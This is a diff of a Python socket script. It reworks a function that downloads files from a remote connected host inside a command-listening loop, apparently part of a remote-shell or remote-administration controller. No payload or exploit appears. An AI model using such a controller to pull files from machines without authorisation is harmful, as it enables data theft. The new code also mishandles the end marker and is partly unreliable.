@@ -132,37 +132,24 @@ def send_data(s, plain_text):
     if DEBUG:
         print_info("Sent:\n" +plain_text)
 
-def file_transfer_get(conn, command):      #get file from server
-    new_cmd = " ".join(command.split()[:2])
-    send_data(conn, new_cmd + "[END]")
-    file = command.split()
-    dest_filename = file[2]
-    
-    if VERBOSE:
-        print_info("Trying to Download {} --> {}".format(command.split()[1], dest_filename))
-    
-    data = base64_decode(conn.recv(1024).decode('utf-8'))
-    if DEBUG:
-        print(data)
-    if "[file-not-found]" in data:
-        print_fail("File not found")          
-    elif "[file-found]" in data:
+def file_transfer_get(conn, filename):      #get file from server
+    try:
+        with open(filename, "wb") as f:
+            while True:
+                # read 1024 bytes from the socket (receive)
+                bytes_read = conn.recv(128)
+                if not bytes_read:    
+                    # nothing is received
+                    # file transmitting is done
+                    break
+                if bytes_read.endswith(b"[END]"):
+                    f.write(bytes_read.rstrip(b"[END]"))
+                    break
+                # write to the file the bytes we just received
+                f.write(bytes_read)
         if VERBOSE:
-            print_good("File Found, Downloading...")
-        try:
-            with open(dest_filename,'wb') as f:
-                recv_data = conn.recv(128).decode('utf-8')
-                while not recv_data.endswith('[END]'):
-                    recv_data = conn.recv(128).decode('utf-8')
-                    print("Transferring...")
-                    recv_decoded = base64_decode(recv_data.rstrip("[END]"))
-                
-                if type(recv_decoded) is str:
-                    f.write(recv_decoded.encode())
-                else:
-                    f.write(recv_decoded)
-            print_good("File Downloaded!")
-        except Exception as e:
+            print_good("Transfer completed")
+    except Exception as e:
             print(exc_info)
             print(e)
             print_fail("Error on Line:{}".format(exc_info()[-1].tb_lineno))
@@ -410,7 +397,20 @@ def listen():
                             if path.dirname(command.split()[2]) != "":
                                 path_exists = path.exists(path.dirname(command.split()[2]))
                             if path_exists:
-                                file_transfer_get(conn, command)
+                                new_cmd = " ".join(command.split()[:2])
+                                send_data(conn, new_cmd + "[END]")
+                                file = command.split()
+                                dest_filename = file[2]
+                                if VERBOSE:
+                                    print_info("Trying to Download {} --> {}".format(command.split()[1], dest_filename))
+                                
+                                data = conn.recv(1024).decode('utf-8')
+                                if "[file-not-found]" in data:
+                                    print_fail("File not found")          
+                                elif "[file-found]" in data:
+                                    if VERBOSE:
+                                        print_good("File Found, Downloading...")
+                                    file_transfer_get(conn, dest_filename)
                             else:
                                 print_warn("Destination file path does not exist")
                     cmd = ""
